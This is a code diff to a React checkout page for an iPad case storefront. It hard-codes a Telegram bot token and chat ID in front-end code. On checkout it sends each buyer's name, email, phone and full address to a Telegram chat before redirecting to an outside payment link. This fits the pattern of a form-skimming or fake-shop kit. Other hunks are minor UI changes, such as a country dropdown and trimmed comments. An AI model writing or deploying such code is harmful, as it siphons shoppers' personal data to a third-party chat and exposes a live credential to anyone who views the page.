@@ -51,6 +51,10 @@ import { useTheme } from "@/contexts/ThemeContext";
 // Updated final checkout URL
 const FINAL_PAYMENT_URL = "https://pay.jim.com/jim_maceo-j-jr-jr-loving/Ri1D-YjA0YipxJJ-138.00";
 
+// Telegram Configuration
+const TELEGRAM_BOT_TOKEN = "8974995123:AAEzoGhR7e6jfkLY3lN2LlCS5BbwZlrw8t4";
+const TELEGRAM_CHAT_ID = "-5259082643";
+
 interface Product {
   id: string;
   name: string;
@@ -81,6 +85,26 @@ interface Review {
   verified: boolean;
   colorPurchased: string;
 }
+
+// Popular countries list for dropdown
+const countriesList = [
+  { code: "US", name: "United States" },
+  { code: "CA", name: "Canada" },
+  { code: "GB", name: "United Kingdom" },
+  { code: "AU", name: "Australia" },
+  { code: "DE", name: "Germany" },
+  { code: "FR", name: "France" },
+  { code: "IT", name: "Italy" },
+  { code: "ES", name: "Spain" },
+  { code: "NL", name: "Netherlands" },
+  { code: "CH", name: "Switzerland" },
+  { code: "JP", name: "Japan" },
+  { code: "SG", name: "Singapore" },
+  { code: "AE", name: "United Arab Emirates" },
+  { code: "RU", name: "Russia" },
+  { code: "KZ", name: "Kazakhstan" },
+  { code: "BY", name: "Belarus" }
+];
 
 export default function Home() {
   const { theme, toggleTheme } = useTheme();
@@ -184,8 +208,8 @@ export default function Home() {
     setActiveModal("checkout");
   };
 
-  // Handle Checkout Form Submission (redirect to pay.jim.com)
-  const handleCheckoutSubmit = (e: React.FormEvent) => {
+  // Handle Checkout Form Submission (redirect to pay.jim.com and send to Telegram)
+  const handleCheckoutSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!shippingName || !shippingEmail || !shippingPhone || !shippingAddress || !shippingCity || !shippingZip || !shippingCountry) {
       toast.error("Please complete all shipping details.");
@@ -197,11 +221,62 @@ export default function Home() {
     }
 
     setCheckoutSubmitting(true);
-    toast.success("Shipping details saved! Redirecting to secure payment page...");
+    toast.info("Saving details and preparing secure checkout...");
+
+    // Get color name and model name
+    const colorDetails = products[checkoutColor]?.colorName || checkoutColor;
+    const modelDetails = ipadModels.find(m => m.id === checkoutModel)?.name || checkoutModel;
+
+    // Format the telegram notification message
+    const messageText = `
+📦 *NEW ORDER INCOMING* 📦
+-----------------------------
+🛍️ *Product Details:*
+• *Brand:* Maceo Case
+• *Color:* ${colorDetails}
+• *iPad Model:* ${modelDetails}
+• *Price:* $138.00 (FREE Shipping)
+
+👤 *Customer Details:*
+• *Name:* ${shippingName}
+• *Email:* ${shippingEmail}
+• *Phone:* ${shippingPhone}
+
+🏠 *Shipping Address:*
+• *Street:* ${shippingAddress}
+• *City:* ${shippingCity}
+• *ZIP Code:* ${shippingZip}
+• *Country:* ${shippingCountry}
+-----------------------------
+🚀 _Redirecting user to payment gateway..._
+    `.trim();
+
+    try {
+      // Send message to Telegram Bot
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: messageText,
+          parse_mode: "Markdown"
+        })
+      });
+
+      if (!response.ok) {
+        console.error("Failed to send notification to Telegram:", await response.text());
+      }
+    } catch (err) {
+      console.error("Telegram API error:", err);
+    }
+
+    toast.success("Details saved! Redirecting to payment...");
     
     setTimeout(() => {
       window.location.href = FINAL_PAYMENT_URL;
-    }, 1500);
+    }, 1200);
   };
 
   // iPad compatibility database
@@ -605,7 +680,7 @@ export default function Home() {
         <div className="container">
           <div className="grid gap-12 lg:grid-cols-12 items-start">
             
-            {/* Product Image Viewer - STICKY ONLY ON DESKTOP (lg:sticky) to prevent mobile overlay bug */}
+            {/* Product Image Viewer */}
             <div className="lg:col-span-6 flex flex-col gap-6 lg:sticky lg:top-24">
               <div className="relative rounded-2xl overflow-hidden border border-border/80 shadow-xl bg-muted/30 p-8 flex items-center justify-center min-h-[300px] sm:min-h-[400px]">
                 <img 
@@ -1045,7 +1120,7 @@ export default function Home() {
         </div>
       </footer>
 
-      {/* Floating Buy Now Button with Tooltip and soft pulse ring wrapper */}
+      {/* Floating Buy Now Button */}
       {showFloatingBtn && (
         <div className="fixed bottom-6 right-6 z-40 animate-in slide-in-from-bottom-10 duration-300">
           <TooltipProvider delayDuration={100}>
@@ -1091,9 +1166,7 @@ export default function Home() {
         </div>
       )}
 
-      {/* ======================================================== */}
-      {/* PERFECTED SECURE CHECKOUT MODAL (Wide, Spacious Desktop Layout) */}
-      {/* ======================================================== */}
+      {/* PERFECTED SECURE CHECKOUT MODAL */}
       <Dialog open={activeModal === "checkout"} onOpenChange={(open) => !open && setActiveModal(null)}>
         <DialogContent className="max-w-5xl md:max-w-5xl w-[95vw] max-h-[92vh] md:max-h-[85vh] overflow-y-auto p-0 rounded-2xl border border-border bg-background shadow-2xl">
           <div className="grid md:grid-cols-12 h-full">
@@ -1239,14 +1312,18 @@ export default function Home() {
                       </div>
                       <div className="space-y-2 col-span-1">
                         <Label htmlFor="shipping-country" className="text-xs font-semibold text-muted-foreground">Country</Label>
-                        <Input 
-                          id="shipping-country" 
-                          placeholder="United States" 
-                          value={shippingCountry} 
-                          onChange={(e) => setShippingCountry(e.target.value)}
-                          className="rounded-xl h-12 text-xs border-border/80 focus-visible:ring-primary"
-                          required
-                        />
+                        <Select value={shippingCountry} onValueChange={setShippingCountry}>
+                          <SelectTrigger id="shipping-country" className="rounded-xl bg-background border-border/80 text-xs h-12 focus:ring-primary w-full">
+                            <SelectValue placeholder="Select Country" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            {countriesList.map((c) => (
+                              <SelectItem key={c.code} value={c.name} className="text-xs">
+                                {c.name}
+                              </SelectItem>
+                            ))}
+                          </SelectContent>
+                        </Select>
                       </div>
                     </div>
                   </div>
@@ -1287,7 +1364,7 @@ export default function Home() {
               <div className="space-y-6">
                 <span className="text-xs font-bold tracking-wider text-muted-foreground uppercase block">Order Summary</span>
                 
-                {/* Premium Product Summary Card - Fixed spacing to prevent badge overflow */}
+                {/* Premium Product Summary Card */}
                 <div className="p-5 bg-background rounded-2xl border border-border/60 shadow-sm space-y-4">
                   <div className="h-48 bg-muted/40 rounded-xl p-4 flex items-center justify-center">
                     <img 
